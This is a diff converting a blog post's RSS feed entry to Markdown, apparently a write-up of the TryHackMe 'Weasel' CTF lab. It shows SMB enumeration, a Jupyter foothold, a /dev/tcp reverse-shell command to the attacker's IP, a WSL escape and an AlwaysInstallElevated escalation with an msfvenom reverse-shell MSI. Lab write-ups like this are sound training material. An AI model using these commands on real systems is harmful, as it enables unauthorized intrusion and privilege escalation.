@@ -1,26 +1,27 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
-  <channel>
-    <title>Linux on Ep1cac</title>
-    <link>http://localhost:1313/tags/linux/</link>
-    <description>Recent content in Linux on Ep1cac</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
-    <copyright>Ep1cac</copyright>
-    <lastBuildDate>Mon, 23 Dec 2024 12:13:37 -0500</lastBuildDate><atom:link href="http://localhost:1313/tags/linux/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
-    
-    
-    <item>
-      <title>Weasel</title>
-      <link>http://localhost:1313/posts/weasel/</link>
-      <pubDate>Mon, 23 Dec 2024 12:13:37 -0500</pubDate>
-      
-      <guid>http://localhost:1313/posts/weasel/</guid>
-      <description><![CDATA[<p><img src="/img/weasel/weasel.png" alt="Weasel"></p>
-<h3 id="description">Description</h3>
-<p>Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.</p>
-<h3 id="recon">Recon</h3>
-<p>First thing&rsquo;s first. Let&rsquo;s start with a nmap scan.</p>
-<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Sun Dec 22 23:42:51 2024 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.34.193
+---
+title: "Weasel"
+date: 2024-12-23T12:13:37-05:00
+draft: false
+tags:
+- Windows
+- WSL Escape
+- Linux
+- AlwaysInstallElevated
+- Autologon
+---
+
+![Weasel](/img/weasel/weasel.png)
+
+
+### Description
+Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.
+
+
+### Recon
+First thing's first. Let's start with a nmap scan.
+
+```
+# Nmap 7.94SVN scan initiated Sun Dec 22 23:42:51 2024 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.34.193
 Increasing send delay for 10.10.34.193 from 0 to 5 due to 547 out of 1366 dropped probes since last increase.
 Increasing send delay for 10.10.34.193 from 5 to 10 due to 11 out of 21 dropped probes since last increase.
 Nmap scan report for 10.10.34.193
@@ -100,11 +101,17 @@ HOP RTT       ADDRESS
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Mon Dec 23 00:11:48 2024 -- 1 IP address (1 host up) scanned in 1737.39 seconds
-</code></pre><p>We some interesting ports open. Looking at port 8888, there is a notebook server.</p>
-<p><img src="/img/weasel/jupyter.png" alt="Jupyter interface"></p>
-<p>Unfortunately, we don&rsquo;t have a token or password. Next, I took a look at the SMB shares on port 445 and noticed that guest access was allowed.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
-└─$ nxc smb 10.10.34.193 -u guest -p &#39;&#39; --shares
+```
+
+We some interesting ports open. Looking at port 8888, there is a notebook server.
+
+![Jupyter interface](/img/weasel/jupyter.png)
+
+Unfortunately, we don't have a token or password. Next, I took a look at the SMB shares on port 445 and noticed that guest access was allowed.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.34.193 -u guest -p '' --shares
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest: 
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Enumerated shares
@@ -114,11 +121,15 @@ SMB         10.10.34.193    445    DEV-DATASCI-JUP  ADMIN$                      
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  C$                              Default share
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
-</code></pre><p>We have read and write permissions on the nonstandard <code>datasci-team</code>  share. Taking</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
-└─$ smbclient //10.10.34.193/datasci-team -U guest --password=&#39;&#39;
-Try &#34;help&#34; to get a list of possible commands.
-smb: \&gt; ls
+```
+
+We have read and write permissions on the nonstandard ```datasci-team```  share. Taking
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ smbclient //10.10.34.193/datasci-team -U guest --password=''
+Try "help" to get a list of possible commands.
+smb: \> ls
   .                                   D        0  Sun Dec 22 21:13:41 2024
   ..                                  D        0  Sun Dec 22 21:13:41 2024
   .ipynb_checkpoints                 DA        0  Thu Aug 25 10:26:47 2022
@@ -132,12 +143,16 @@ smb: \&gt; ls
   weasel.txt                          A       51  Thu Aug 25 10:26:46 2022
 
                 15587583 blocks of size 4096. 8928179 blocks available
-smb: \&gt; 
-</code></pre><p>I transferred everything to my local machine for easier enumeration.</p>
-<pre tabindex="0"><code>smb: \&gt; lcd /tmp/smb
-smb: \&gt; recurse on
-smb: \&gt; prompt off
-smb: \&gt; mget *
+smb: \> 
+```
+
+I transferred everything to my local machine for easier enumeration.
+
+```
+smb: \> lcd /tmp/smb
+smb: \> recurse on
+smb: \> prompt off
+smb: \> mget *
 getting file \Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv of size 146 as Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 getting file \MPE63-3_745-757.pdf of size 414804 as MPE63-3_745-757.pdf (109.2 KiloBytes/sec) (average 68.5 KiloBytes/sec)
 getting file \requirements.txt of size 12 as requirements.txt (0.0 KiloBytes/sec) (average 58.5 KiloBytes/sec)
@@ -151,8 +166,12 @@ getting file \papers\Dillard_Living_Like_Weasels.pdf of size 45473 as papers/Dil
 getting file \pics\57475-weasel-facts.html of size 301025 as pics/57475-weasel-facts.html (110.1 KiloBytes/sec) (average 120.4 KiloBytes/sec)
 getting file \pics\long-tailed-weasel of size 250269 as pics/long-tailed-weasel (72.2 KiloBytes/sec) (average 116.1 KiloBytes/sec)
 getting file \pics\Weasel of size 229746 as pics/Weasel (81.6 KiloBytes/sec) (average 113.8 KiloBytes/sec)
-</code></pre><p>A lot of stuff about weasels, but also the file <code>jupyter-token.txt</code> in <code>misc</code>.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/smb]
+```
+
+A lot of stuff about weasels, but also the file ```jupyter-token.txt``` in ```misc```.
+
+```
+┌──(kali㉿kali)-[/tmp/smb]
 └─$ ls -al misc 
 total 4
 drwxrwxr-x 2 kali kali  60 Dec 22 21:15 .
@@ -162,23 +181,36 @@ drwxrwxr-x 6 kali kali 220 Dec 22 21:15 ..
 ┌──(kali㉿kali)-[/tmp/smb]
 └─$ cat misc/jupyter-token.txt
 067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
-</code></pre><h3 id="foothold">Foothold</h3>
-<p>We are able to use this token to login to Jupyter Notebook on port 8888, where we can edit <code>weasel.ipynb</code> or create a new Jupyter notebook file to get a shell.</p>
-<p><img src="/img/weasel/logon.png" alt="Jupyter authenticated"></p>
-<p>I tried to use Python to execute PowerShell and get a reverse shell that way. I wasn&rsquo;t able to get a connection, and after some testing realized that Windows-specific features like PowerShell simply weren&rsquo;t being executed correctly. On the other hand, Linux commands were working perfectly fine. Given that our nmap scan revealed many details that our target is a Windows machine (e.g. RDP and Microsoft RPC). It&rsquo;s fairly safe to say that we are up against WSL.</p>
-<p><img src="/img/weasel/compare.png" alt="PowerShell vs Bash"></p>
-<p>So I got a shell using bash.</p>
-<p><img src="/img/weasel/ipy_shell.png" alt="Python os shell"></p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/smb]
+```
+
+### Foothold
+We are able to use this token to login to Jupyter Notebook on port 8888, where we can edit ```weasel.ipynb``` or create a new Jupyter notebook file to get a shell.
+
+![Jupyter authenticated](/img/weasel/logon.png)
+
+I tried to use Python to execute PowerShell and get a reverse shell that way. I wasn't able to get a connection, and after some testing realized that Windows-specific features like PowerShell simply weren't being executed correctly. On the other hand, Linux commands were working perfectly fine. Given that our nmap scan revealed many details that our target is a Windows machine (e.g. RDP and Microsoft RPC). It's fairly safe to say that we are up against WSL.
+
+![PowerShell vs Bash](/img/weasel/compare.png)
+
+So I got a shell using bash.
+
+![Python os shell](/img/weasel/ipy_shell.png)
+
+```
+┌──(kali㉿kali)-[/tmp/smb]
 └─$ nc -nvlp 21
 listening on [any] 21 ...
 connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50376
 bash: cannot set terminal process group (10): Invalid argument
 bash: no job control in this shell
 (base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
-</code></pre><h3 id="breaking-out-of-wsl">Breaking out of WSL</h3>
-<p>Checking sudo permissions is something I always do early one since it&rsquo;s usually an easy win, so I quickly found that <code>/home/dev-datasci/.local/bin/jupyter</code> can be executed with root privileges without a password.</p>
-<pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
+```
+
+### Breaking out of WSL
+Checking sudo permissions is something I always do early one since it's usually an easy win, so I quickly found that ```/home/dev-datasci/.local/bin/jupyter``` can be executed with root privileges without a password.
+
+```
+(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
 sudo -l
 Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
     env_reset, mail_badpass,
@@ -188,8 +220,12 @@ User dev-datasci may run the following commands on DEV-DATASCI-JUP:
     (ALL : ALL) ALL
     (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci
         -c *
-</code></pre><p>We have write permissions to <code>/home/dev-datasci/.local/bin/</code>, and since there isn&rsquo;t a <code>jupyter</code> file there, we can create our own.</p>
-<pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ pwd
+```
+
+We have write permissions to ```/home/dev-datasci/.local/bin/```, and since there isn't a ```jupyter``` file there, we can create our own.
+
+```
+(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ pwd
 pwd
 /home/dev-datasci/datasci-team
 (base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ ls -al ../.local/bin
@@ -200,22 +236,33 @@ drwx------ 1 dev-datasci dev-datasci 4096 Aug 25  2022 ..
 -rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py
 -rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3
 -rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3.8
-(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.13.48.55/80 0&gt;&amp;1&#39;&#34; &gt; ../.local/bin/jupyter
-echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.13.48.55/80 0&gt;&amp;1&#39;&#34; &gt; ../.local/bin/jupyter
+(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.13.48.55/80 0>&1'" > ../.local/bin/jupyter
+echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.13.48.55/80 0>&1'" > ../.local/bin/jupyter
 (base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ chmod +x ../.local/bin/jupyter
 chmod +x ../.local/bin/jupyter
-</code></pre><p>Now to leverage our sudo privileges and execute it as root&hellip;</p>
-<pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo /home/dev-datasci/.local/bin/jupyter
+```
+
+Now to leverage our sudo privileges and execute it as root...
+
+```
+(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo /home/dev-datasci/.local/bin/jupyter
 sudo /home/dev-datasci/.local/bin/jupyter
-</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/smb]
+```
+
+```
+┌──(kali㉿kali)-[/tmp/smb]
 └─$ nc -nvlp 80
 listening on [any] 80 ...
 connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50863
 bash: cannot set terminal process group (10): Invalid argument
 bash: no job control in this shell
 root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# 
-</code></pre><p>With root privileges, we now have a better chance of escaping the WSL environment and onto the host OS. I tried to navigate to the host filesystem under <code>/mnt</code>. It contains a mount to the C drive, but it&rsquo;s empty&hellip;</p>
-<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt
+```
+
+With root privileges, we now have a better chance of escaping the WSL environment and onto the host OS. I tried to navigate to the host filesystem under ```/mnt```. It contains a mount to the C drive, but it's empty...
+
+```
+root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt
 ls -al /mnt
 total 0
 drwxr-xr-x 1 root root 4096 Aug 25  2022 .
@@ -226,14 +273,18 @@ ls -al /mnt/c
 total 0
 drwxrwxrwx 1 root root 4096 Aug 25  2022 .
 drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
-</code></pre><p>Since we are root, we can remount the filesystem.</p>
-<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# sudo mount -t drvfs C: /mnt/c
+```
+
+Since we are root, we can remount the filesystem.
+
+```
+root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# sudo mount -t drvfs C: /mnt/c
 sudo mount -t drvfs C: /mnt/c
 root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt/c
 ls -al /mnt/c
-ls: cannot read symbolic link &#39;/mnt/c/Documents and Settings&#39;: Permission denied
-ls: cannot access &#39;/mnt/c/pagefile.sys&#39;: Permission denied
-ls: &#39;/mnt/c/System Volume Information&#39;: Permission denied
+ls: cannot read symbolic link '/mnt/c/Documents and Settings': Permission denied
+ls: cannot access '/mnt/c/pagefile.sys': Permission denied
+ls: '/mnt/c/System Volume Information': Permission denied
 total 0
 drwxrwxrwx 1 root root 4096 Aug 25  2022 $Recycle.Bin
 drwxrwxrwx 1 root root 4096 Mar 14  2023 .
@@ -249,23 +300,37 @@ drwxrwxrwx 1 root root 4096 Aug 25  2022 Users
 drwxrwxrwx 1 root root 4096 Mar 13  2023 Windows
 drwxrwxrwx 1 root root 4096 Dec 22 19:56 datasci-team
 -????????? ? ?    ?       ?            ? pagefile.sys
-</code></pre><p>I tried to find ways to pivot to the host environment like copying the <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code> registries to dump local SAM hashes and searching for credentials in files. Unfortunately, all of these lead nowhere.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
-<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SAM /tmp/sam
+```
+
+I tried to find ways to pivot to the host environment like copying the ```HKLM\SAM``` and ```HKLM\SYSTEM``` registries to dump local SAM hashes and searching for credentials in files. Unfortunately, all of these lead nowhere.[^1]
+
+[^1]: You can read still the flags here, but AFAIK getting command execution on Windows isn't possible from the mounted filesystem.
+
+```
+root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SAM /tmp/sam
 cp /mnt/c/Windows/System32/config/SAM /tmp/sam
-cp: cannot open &#39;/mnt/c/Windows/System32/config/SAM&#39; for reading: Permission denied
+cp: cannot open '/mnt/c/Windows/System32/config/SAM' for reading: Permission denied
 root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SYSTEM /tmp/system
 cp /mnt/c/Windows/System32/config/SYSTEM /tmp/system
-cp: cannot open &#39;/mnt/c/Windows/System32/config/SYSTEM&#39; for reading: Permission denied
-</code></pre><p>I eventually fell back to WSL to look for other clues. We see a ssh private key in the <code>dev-datasci</code> user&rsquo;s home directory.</p>
-<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team$ ls ..
+cp: cannot open '/mnt/c/Windows/System32/config/SYSTEM' for reading: Permission denied
+```
+
+I eventually fell back to WSL to look for other clues. We see a ssh private key in the ```dev-datasci``` user's home directory.
+
+```
+root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team$ ls ..
 ls ..
 anaconda3
 anacondainstall.sh
 datasci-team
 dev-datasci-lowpriv_id_ed25519
-</code></pre><p>RID cycling confirms <code>dev-datasci-lowpriv</code> is a valid user on the Windows machine.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
-└─$ nxc smb 10.10.34.193 -u guest -p &#39;&#39; --rid-brute
+```
+
+RID cycling confirms ```dev-datasci-lowpriv``` is a valid user on the Windows machine.
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ nxc smb 10.10.34.193 -u guest -p '' --rid-brute
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest: 
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  500: DEV-DATASCI-JUP\Administrator (SidTypeUser)
@@ -275,47 +340,67 @@ SMB         10.10.34.193    445    DEV-DATASCI-JUP  504: DEV-DATASCI-JUP\WDAGUti
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  513: DEV-DATASCI-JUP\None (SidTypeGroup)
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  1000: DEV-DATASCI-JUP\dev-datasci-lowpriv (SidTypeUser)
 SMB         10.10.34.193    445    DEV-DATASCI-JUP  1001: DEV-DATASCI-JUP\sshd (SidTypeUser)
-</code></pre><p>We can therefore ssh onto the Windows host OS.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+```
+
+We can therefore ssh onto the Windows host OS.
+
+```
+┌──(kali㉿kali)-[/tmp]
 └─$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.34.193
-</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
-<p>We can use WinPEAS to facilitate our enumeration. I transferred it to the Windows host through scp.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+```
+
+### Privilege Escalation
+We can use WinPEAS to facilitate our enumeration. I transferred it to the Windows host through scp.
+
+```
+┌──(kali㉿kali)-[~]
 └─$ scp -i /tmp/id_rsa ~/winPEASany.exe dev-datasci-lowpriv@10.10.34.193:C:\Users\datasci-team\winpeas.exe    
 winPEASany.exe
-</code></pre><p>The filename did get jumbled up, so I renamed it for clarity.</p>
-<pre tabindex="0"><code>dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv&gt;dir 
+```
+
+The filename did get jumbled up, so I renamed it for clarity.
+
+```
+dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>dir 
  Volume in drive C has no label. 
  Volume Serial Number is 8AA3-53D1
 
  Directory of C:\Users\dev-datasci-lowpriv
 
-12/22/2024  08:30 PM    &lt;DIR&gt;          .
-12/22/2024  08:30 PM    &lt;DIR&gt;          ..
-08/25/2022  05:20 AM    &lt;DIR&gt;          .ssh
-08/25/2022  04:22 AM    &lt;DIR&gt;          3D Objects
-08/25/2022  04:22 AM    &lt;DIR&gt;          Contacts
-08/25/2022  06:39 AM    &lt;DIR&gt;          Desktop
-08/25/2022  04:22 AM    &lt;DIR&gt;          Documents
-08/25/2022  04:22 AM    &lt;DIR&gt;          Downloads
-08/25/2022  04:22 AM    &lt;DIR&gt;          Favorites
-08/25/2022  04:22 AM    &lt;DIR&gt;          Links
-08/25/2022  04:22 AM    &lt;DIR&gt;          Music
-08/25/2022  04:22 AM    &lt;DIR&gt;          Pictures
-08/25/2022  04:22 AM    &lt;DIR&gt;          Saved Games
-08/25/2022  04:22 AM    &lt;DIR&gt;          Searches
+12/22/2024  08:30 PM    <DIR>          .
+12/22/2024  08:30 PM    <DIR>          ..
+08/25/2022  05:20 AM    <DIR>          .ssh
+08/25/2022  04:22 AM    <DIR>          3D Objects
+08/25/2022  04:22 AM    <DIR>          Contacts
+08/25/2022  06:39 AM    <DIR>          Desktop
+08/25/2022  04:22 AM    <DIR>          Documents
+08/25/2022  04:22 AM    <DIR>          Downloads
+08/25/2022  04:22 AM    <DIR>          Favorites
+08/25/2022  04:22 AM    <DIR>          Links
+08/25/2022  04:22 AM    <DIR>          Music
+08/25/2022  04:22 AM    <DIR>          Pictures
+08/25/2022  04:22 AM    <DIR>          Saved Games
+08/25/2022  04:22 AM    <DIR>          Searches
 12/22/2024  08:31 PM         9,841,664 Usersdatasci-teamwinpeas.exe
-08/25/2022  04:22 AM    &lt;DIR&gt;          Videos
+08/25/2022  04:22 AM    <DIR>          Videos
                1 File(s)      9,841,664 bytes
               15 Dir(s)  36,645,306,368 bytes free
 
-dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv&gt;ren Usersdatasci-teamwinpeas.exe winpeas.exe
-</code></pre><p>Running WinPEAS reveals a couple things of interest. First, <code>dev-datasci-lowpriv</code> has permissions to run Windows Installer packages with elevated privileges.</p>
-<p><img src="/img/weasel/install_elevated.png" alt="Winpeas AlwaysInstallElevated"></p>
-<p><code>dev-datasci-lowpriv</code> also has its plaintext credentials stored for AutoLogon.</p>
-<p><img src="/img/weasel/autologin.png" alt="AutoLogon credentials"></p>
-<p>Now all we need to do is create a malicious .msi file and install it on the Windows host for privilege escalation. I generated one using msfvenom.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>ren Usersdatasci-teamwinpeas.exe winpeas.exe
+```
+
+Running WinPEAS reveals a couple things of interest. First, ```dev-datasci-lowpriv``` has permissions to run Windows Installer packages with elevated privileges.
+
+![Winpeas AlwaysInstallElevated](/img/weasel/install_elevated.png)
+
+```dev-datasci-lowpriv``` also has its credentials stored for AutoLogon.
+
+![AutoLogon credentials](/img/weasel/autologin.png)
+
+Now all we need to do is create a malicious .msi file and install it on the Windows host for privilege escalation. I generated one using msfvenom.
+
+```
+┌──(kali㉿kali)-[/tmp]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.13.48.55 LPORT=8000 -f msi -o shell.msi
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -323,34 +408,29 @@ No encoder specified, outputting raw payload
 Payload size: 354 bytes
 Final size of msi file: 159744 bytes
 Saved as: shell.msi
-</code></pre><p>After transferring it onto our target, we can execute it. I had to explicitly run msiexec as <code>dev-datasci-lowpriv</code> with &ldquo;runas&rdquo;.</p>
-<pre tabindex="0"><code>dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv&gt;runas /user:dev-datasci-lowpriv &#34;msiexec /quiet /i C:\Users\dev-datasci-low
-priv\shell.msi&#34;
+```
+
+After transferring it onto our target, we can execute it. I had to explicitly run msiexec as ```dev-datasci-lowpriv``` with "runas".
+
+```
+dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>runas /user:dev-datasci-lowpriv "msiexec /quiet /i C:\Users\dev-datasci-low
+priv\shell.msi"
 Enter the password for dev-datasci-lowpriv:
-Attempting to start msiexec /quiet /i C:\Users\dev-datasci-lowpriv\shell.msi as user &#34;DEV-DATASCI-JUP\dev-datasci-lowpriv&#34; ...
-</code></pre><p>And now we have a shell as <code>nt authority\system</code>.</p>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+Attempting to start msiexec /quiet /i C:\Users\dev-datasci-lowpriv\shell.msi as user "DEV-DATASCI-JUP\dev-datasci-lowpriv" ...
+```
+
+And now we have a shell as ```nt authority\system```.
+
+```
+┌──(kali㉿kali)-[/tmp]
 └─$ rlwrap nc -nvlp 8000
 listening on [any] 8000 ...
 connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 53713
 Microsoft Windows [Version 10.0.17763.3287]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32&gt;whoami
+C:\Windows\system32>whoami
 whoami
 nt authority\system
-</code></pre><div class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1">
-<p>You can read still the flags here, but AFAIK getting command execution on Windows isn&rsquo;t possible from the mounted filesystem.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</div>
-]]></description>
-      
-    </item>
-    
-    
-  </channel>
-</rss>
+
+```
